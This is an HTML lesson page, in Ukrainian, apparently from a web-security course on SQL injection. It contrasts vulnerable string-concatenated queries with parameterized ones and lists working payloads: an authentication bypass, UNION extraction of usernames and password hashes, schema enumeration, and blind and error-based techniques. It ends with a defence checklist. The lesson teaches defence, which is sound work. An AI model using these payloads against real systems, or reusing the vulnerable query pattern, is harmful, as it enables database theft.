@@ -1,0 +1,189 @@
+<!-- Модуль 11: SQL-ін'єкція -->
+<h1>Модуль 11 — SQL-ін'єкція</h1>
+
+<!-- ============================================
+     ТЕОРЕТИЧНИЙ РОЗДІЛ
+     ============================================ -->
+<section class="theory-section">
+
+  <h2>Дідусь веб-вразливостей</h2>
+  <p>
+    SQL injection існує з кінця 1990-х. Її вперше публічно задокументував Джефф Форрістал (під псевдонімом «rain.forest.puppy») у журналі Phrack Magazine в 1998 році. Це понад 25 років тому. І все ж, у 2024 році, SQLi <strong>досі входить в OWASP Top 10</strong> і досі спричиняє масові витоки даних. Чому? Бо фундаментальна помилка — змішування коду і даних — неймовірно легко зробити і надзвичайно важко викорінити в великих кодових базах.
+  </p>
+  <p>
+    Ось що робить SQL injection такою небезпечною: вона дає атакуючому прямий доступ до твоєї бази даних. Не фільтрований доступ. Не тільки для читання. <strong>Повний доступ до кожної таблиці, кожного рядка, кожної колонки.</strong> І в багатьох конфігураціях вона виходить за межі бази — читання файлів із файлової системи сервера, виконання команд ОС або переміщення до інших систем у мережі.
+  </p>
+  <p>
+    Якщо XSS — це крадіжка з кишені, то SQL injection — це прохід прямо в банківське сховище.
+  </p>
+
+  <h2>Чому SQL injection існує</h2>
+  <p>
+    Кожна SQL injection має одну й ту саму першопричину: <strong>введення користувача конкатенується безпосередньо в рядок SQL-запиту</strong>. Движок бази даних отримує повний запит одним рядком і не може відрізнити частини, що є «кодом» (SQL-структура, написана розробником), від частин, що є «даними» (значення, надані користувачем).
+  </p>
+  <p>
+    Покажу точно, як це працює. Уяви форму входу, що перевіряє облікові дані:
+  </p>
+
+  <h3>Вразливий код: конкатенація рядків</h3>
+  <pre><code class="language-python"># Python — VULNERABLE
+username = request.form['username']
+password = request.form['password']
+query = f"SELECT * FROM users WHERE username='{username}' AND password_hash='{password}'"
+cursor.execute(query)</code></pre>
+
+  <pre><code class="language-php">// PHP — VULNERABLE
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username='$username' AND password_hash='$password'";
+$result = mysqli_query($conn, $query);</code></pre>
+
+  <p>
+    Коли звичайний користувач вводить <code>alice</code> і <code>mypassword</code>, запит стає:
+  </p>
+  <pre><code class="language-sql">SELECT * FROM users WHERE username='alice' AND password_hash='mypassword'</code></pre>
+  <p>
+    Все чудово. Але що буде, коли атакуючий введе <code>' OR '1'='1</code> як ім'я?
+  </p>
+  <pre><code class="language-sql">SELECT * FROM users WHERE username='' OR '1'='1' AND password_hash='anything'</code></pre>
+  <p>
+    Одинарна лапка атакуючого <strong>закриває рядок username</strong>, а <code>OR '1'='1'</code> інтерпретується як SQL-код, а не дані. Оскільки <code>'1'='1'</code> завжди істинне, WHERE повертає всі рядки, і атакуючий увійшов — зазвичай як перший користувач у таблиці, що часто є адміном.
+  </p>
+
+  <div class="callout callout-danger">
+    <strong>Фундаментальна проблема:</strong> Коли ти конкатенуєш рядки в запит, база даних не може визначити, де закінчується SQL розробника і починаються дані користувача. Одинарна лапка виконує подвійну роль — вона і роздільник рядків у SQL, і цілком допустимий символ у введенні. Ця двозначність — корінь всіх SQL injection.
+  </div>
+
+  <h3>Виправлення: параметризовані запити</h3>
+  <p>
+    Параметризовані запити (prepared statements) вирішують це повністю, <strong>відділяючи SQL-структуру від значень даних</strong>. SQL-шаблон надсилається до бази першим, а значення — окремо. База точно знає, що є кодом, а що — даними. Ін'єкція стає неможливою.
+  </p>
+
+  <pre><code class="language-python"># Python — SAFE (parameterized)
+cursor.execute(
+    "SELECT * FROM users WHERE username=? AND password_hash=?",
+    (username, password)
+)</code></pre>
+
+  <pre><code class="language-php">// PHP — SAFE (prepared statement)
+$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password_hash=?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();</code></pre>
+
+  <p>
+    Навіть якщо атакуючий введе <code>' OR '1'='1</code>, база трактує весь рядок як буквальне значення username. Вона шукає користувача з ім'ям буквально <code>' OR '1'='1</code> — якого не існує. Ніякої ін'єкції. Ніякого обходу.
+  </p>
+
+  <div class="callout callout-info">
+    <strong>Аналогія:</strong> Уяви заповнення паперової форми. Конкатенація рядків — це дозволити користувачу писати на самій формі — він може вийти за межі полів і змінити інструкції форми. Параметризовані запити — це коли користувач пише на стікерах, що вкладаються В поля — що б він не написав, це залишається всередині визначеної області і не може змінити структуру форми.
+  </div>
+
+  <h2>UNION-Based SQL Injection</h2>
+  <p>
+    Обхід автентифікації — це лише початок. Справжня сила SQL injection — це <strong>вилучення даних</strong>. Атака <code>UNION SELECT</code> додає другий запит до оригінального, дозволяючи читати дані з БУДЬ-ЯКОЇ таблиці бази. Це як можливість фотокопіювати будь-який файл у шафі — а не тільки той, що тобі дали.
+  </p>
+  <p>
+    Дві вимоги для UNION-атаки:
+  </p>
+  <ol>
+    <li>Кількість колонок у впровадженому <code>SELECT</code> має <strong>точно збігатися</strong> з оригінальним запитом.</li>
+    <li>Типи даних відповідних колонок мають бути сумісні (або використовуй <code>NULL</code>, що сумісний з усім).</li>
+  </ol>
+
+  <h3>Крок 1 — Визначення кількості колонок</h3>
+  <p>
+    <strong>Техніка A — ORDER BY:</strong> Збільшуй індекс колонки, поки не отримаєш помилку.
+  </p>
+
+  <pre><code class="language-sql">-- If the query has 4 columns:
+' ORDER BY 1--    (OK — column 1 exists)
+' ORDER BY 2--    (OK — column 2 exists)
+' ORDER BY 3--    (OK — column 3 exists)
+' ORDER BY 4--    (OK — column 4 exists)
+' ORDER BY 5--    (ERROR! — column 5 does not exist → table has 4 columns)</code></pre>
+
+  <p>
+    <strong>Техніка B — UNION SELECT NULL:</strong> Додавай NULL, поки запит не спрацює.
+  </p>
+
+  <pre><code class="language-sql">' UNION SELECT NULL--                     (error — wrong column count)
+' UNION SELECT NULL,NULL--                (error)
+' UNION SELECT NULL,NULL,NULL--           (error)
+' UNION SELECT NULL,NULL,NULL,NULL--      (success! — 4 columns)</code></pre>
+
+  <h3>Крок 2 — Визначення колонок виводу</h3>
+  <pre><code class="language-sql">' UNION SELECT 'col1','col2','col3','col4'--</code></pre>
+  <p>
+    Якщо ти бачиш «col2» і «col3» на сторінці, але не «col1» і «col4», ти знаєш, куди вставляти вилучені дані.
+  </p>
+
+  <h3>Крок 3 — Вилучення даних</h3>
+  <pre><code class="language-sql">-- Extract all usernames and password hashes
+' UNION SELECT NULL, group_concat(username || ':' || password_hash, '&lt;br&gt;'), NULL, NULL FROM users--</code></pre>
+
+  <h2>Перерахування схеми — знайти що красти</h2>
+
+  <div class="table-wrapper">
+    <table>
+      <thead><tr><th>База даних</th><th>Список таблиць</th><th>Список колонок</th></tr></thead>
+      <tbody>
+        <tr><td>SQLite</td><td><code>SELECT name FROM sqlite_master WHERE type='table'</code></td><td><code>SELECT sql FROM sqlite_master WHERE name='tablename'</code></td></tr>
+        <tr><td>MySQL</td><td><code>SELECT table_name FROM information_schema.tables</code></td><td><code>SELECT column_name FROM information_schema.columns WHERE table_name='...'</code></td></tr>
+        <tr><td>PostgreSQL</td><td><code>SELECT tablename FROM pg_catalog.pg_tables</code></td><td><code>SELECT column_name FROM information_schema.columns WHERE table_name='...'</code></td></tr>
+        <tr><td>SQL Server</td><td><code>SELECT name FROM sys.tables</code></td><td><code>SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('...')</code></td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h2>Blind SQL Injection — коли не видно результат</h2>
+  <p>
+    Що якщо додаток не відображає результати запиту? <strong>Blind SQL injection</strong> дозволяє вилучати дані по одному біту, ставлячи базі питання «так/ні» та спостерігаючи за поведінкою.
+  </p>
+
+  <h3>Boolean-Based Blind</h3>
+  <pre><code class="language-sql">-- Is the first character of the admin password 'a'?
+' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+-- If the page loads normally → 'a' is correct
+-- If the page shows an error → 'a' is wrong, try 'b', 'c', etc.</code></pre>
+
+  <h3>Time-Based Blind</h3>
+  <pre><code class="language-sql">-- MySQL: if the first char of the DB name is 'a', wait 5 seconds
+' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
+
+-- PostgreSQL equivalent
+'; SELECT CASE WHEN SUBSTRING(current_database(),1,1)='a' THEN pg_sleep(5) END--</code></pre>
+  <p>
+    Якщо відповідь займає 5 секунд — умова істинна. Якщо повертається одразу — хибна. Повільно? Надзвичайно. Але працює.
+  </p>
+
+  <div class="callout callout-info">
+    <strong>sqlmap — швейцарський ніж:</strong> У реальному пентесті ніхто не робить blind SQLi вручну. Інструмент <code>sqlmap</code> автоматизує виявлення і експлуатацію всіх типів SQL injection. Але розуміння технік вручну необхідне — автоматичні інструменти не справляються з крайніми випадками.
+  </div>
+
+  <h3>Error-Based Injection</h3>
+  <pre><code class="language-sql">-- MySQL error-based extraction (EXTRACTVALUE technique)
+' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
+-- Error: "XPATH syntax error: '~5.7.44~'"
+-- The database version is right there in the error message!</code></pre>
+
+  <h2>Реальні зломи через SQL Injection</h2>
+  <ul>
+    <li><strong>Heartland Payment Systems (2008):</strong> Альберт Гонсалес використав SQL injection для крадіжки <strong>130 мільйонів номерів кредитних карт</strong>. Він отримав 20 років тюрми.</li>
+    <li><strong>Sony Pictures (2011):</strong> LulzSec експлуатували тривіальну SQL injection для вилучення <strong>1 мільйона акаунтів</strong>.</li>
+    <li><strong>TalkTalk (2015):</strong> 15-річний підліток отримав доступ до даних <strong>157 000 клієнтів</strong> через SQLi. TalkTalk оштрафували на £400 000.</li>
+    <li><strong>MOVEit Transfer (2023):</strong> SQL injection у продукті для передачі файлів, експлуатована групою Cl0p, зачепила <strong>понад 2 600 організацій і 77 мільйонів людей</strong>.</li>
+  </ul>
+
+  <div class="callout callout-success">
+    <strong>Повний стек захисту:</strong>
+    <ul>
+      <li><strong>Параметризовані запити скрізь</strong> — це одне запобігає 99% SQLi</li>
+      <li><strong>Мінімальні привілеї для БД</strong> — користувач БД веб-додатку не повинен бути <code>root</code></li>
+      <li><strong>Web Application Firewall (WAF)</strong> — ловить очевидні пейлоади, але обходиться</li>
+      <li><strong>Валідація вводу</strong> — відхиляй ввід з неочікуваними символами як додатковий шар</li>
+      <li><strong>Обробка помилок</strong> — ніколи не показуй сирі помилки БД користувачам</li>
+      <li><strong>Використання ORM</strong> — Django ORM, SQLAlchemy, ActiveRecord використовують параметризовані запити за замовчуванням</li>
+    </ul>
+  </div>
+
+</section>
